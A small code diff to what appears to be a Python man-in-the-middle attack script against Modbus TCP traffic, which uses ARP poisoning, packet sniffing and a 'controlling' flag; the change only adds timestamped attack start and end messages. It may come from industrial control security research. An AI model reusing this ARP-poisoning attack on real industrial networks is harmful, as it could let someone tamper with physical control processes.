@@ -417,6 +417,7 @@ def handlePacketAttacking(pkt):
                 av.controlling = True
                 cs.distanceAsked = False
                 cs.directionASked = False
+                print("========================= **ATTACKER INITIALIZIZING ATTACK AT: " + time.strftime("%H:%M:%S"));
         if cs.packetCount%2 == 0:
             poisonARP(1, False)
         return False
@@ -610,7 +611,7 @@ if __name__ == "__main__":
     print(firDB.speed)
     print("FIR Attack, Length of Data Distance: %s Speed: %s" % (len(firDB.distance),len(firDB.speed)))
     sniff(filter="tcp and port " + str(ModbusPort) + " and not ether src " + cs.attackerMAC, stop_filter=handlePacketAttacking, store=0, count=MaxCount)
-    print("************[ATTACKING] Attack Finished***************")
+    print("========================= **ATTACKER FINALIZING ATTACK AT: " + time.strftime("%H:%M:%S"));
     print "CLEANING ARP"
     arpClear()
     print "IDLE"
